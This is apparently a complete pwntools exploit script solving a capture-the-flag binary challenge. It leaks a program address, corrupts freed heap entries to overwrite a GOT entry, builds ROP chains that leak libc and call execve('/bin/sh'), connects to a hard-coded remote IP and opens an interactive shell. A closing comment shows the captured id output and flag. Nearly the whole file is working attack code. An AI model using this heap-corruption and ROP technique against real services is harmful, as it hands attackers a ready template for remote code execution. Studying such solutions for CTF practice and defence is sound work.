# Imports
import re, sys, time
from pwn import *
# Set pwntools context to amd64
context.update(arch='amd64')

# Global debug flag
DEBUG = True


def rop_puts(elf):
  """
  Builds a rop chain payload to dump the GOT address of malloc.
  """ 
  rop = ROP(elf)

  rop.puts(elf.got['malloc'])
  rop.raw(elf.entry + 0x290)

  return (bytes(rop))


def rop_execve(libc):
  """
  Builds a rop chain to call execve("/bin/sh\x00", 0, 0).
  """ 
  rop = ROP(libc)

  rop.execve(next(libc.search(b'/bin/sh\x00')), 0, 0)

  return (bytes(rop))


def main():
  """
  Runs on program execution.
  """
  # Read challenge binary into pwntools
  elf = ELF('vuln')

  # Read libc into pwntools and connect to the challenge binary
  if DEBUG:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = remote('localhost', 3333)
    print("Connected to challenge and waiting for debugger to attach. Press any key to continue...")
    sys.stdin.read(1)
  else:
    libc = ELF('libc6_2.27-3ubuntu1_amd64.so')
    p = remote('34.69.116.108', 3333)

  time.sleep(.1)
  p.recv()
  
  p.sendline(b'0')  # Create User
  time.sleep(.1)
  p.sendline(b'1')
  time.sleep(.1)
  p.sendline(b'A' * 29)
  time.sleep(.1)

  time.sleep(.1)
  p.recv()
  
  p.sendline(b'3')  # Send admin message
  time.sleep(.1)
  p.sendline(b'DATAISHEREEEEE:')
  time.sleep(.1)

  time.sleep(.1)
  data = p.recv()
  exit_str_addr = data.split(b'DATAISHEREEEEE:')[1]
  exit_str_addr = u64( (exit_str_addr[1:7]).ljust(8, b'\x00') )

  entry_addr = exit_str_addr - 0x102a
  elf.address = entry_addr - elf.entry
  
  p.sendline(b'0')  # Create User
  time.sleep(.1)
  p.sendline(b'2')
  time.sleep(.1)
  p.sendline(b'B' * 29)
  time.sleep(.1)

  p.recv()
  p.sendline(b'0')  # Create User
  time.sleep(.1)
  p.sendline(b'3')
  time.sleep(.1)
  p.sendline(b'C' * 29)
  time.sleep(.1)

  p.recv()
  p.sendline(b'2')  # Delete User
  time.sleep(.1)

  p.recv()
  p.sendline(b'2')  # Delete User
  time.sleep(.1)

  p.recv()
  p.sendline(b'1')  # Edit User
  time.sleep(.1)
  p.sendline(b'1')
  time.sleep(.1)
  p.sendline(p64(elf.got['strdup']))
  time.sleep(.1)

  p.recv()
  p.sendline(b'1')  # Edit User
  time.sleep(.1)
  p.sendline(b'1')
  time.sleep(.1)
  p.sendline(p64((ROP(elf)).find_gadget(["pop rbp","ret"]).address))
  time.sleep(.1)

  p.recv()
  p.sendline(b'3')  # Send Message
  time.sleep(.1)
  p.sendline(rop_puts(elf))
  time.sleep(.1)
  
  
  malloc_addr = p.recv()
  malloc_addr = (malloc_addr.split(b'admin to see!\n\n'))[1]
  malloc_addr = malloc_addr[:6]
  malloc_addr = malloc_addr.strip().ljust(8, b'\x00')
  malloc_addr = u64(malloc_addr) 
  print("malloc_addr: " + hex(malloc_addr))

  libc.address = malloc_addr - libc.symbols['malloc']

  time.sleep(2)
  p.sendline(rop_execve(libc))
  
  p.interactive()

  """
  $ id
  uid=1000(vuln) gid=1000(vuln) groups=1000(vuln)
  $ cat /home/vuln/flag.txt
  rooters{1_d0n7_f33l_g00d_mR_Pwn34}ctf
  """

# Hook
if __name__ == '__main__':
  main()
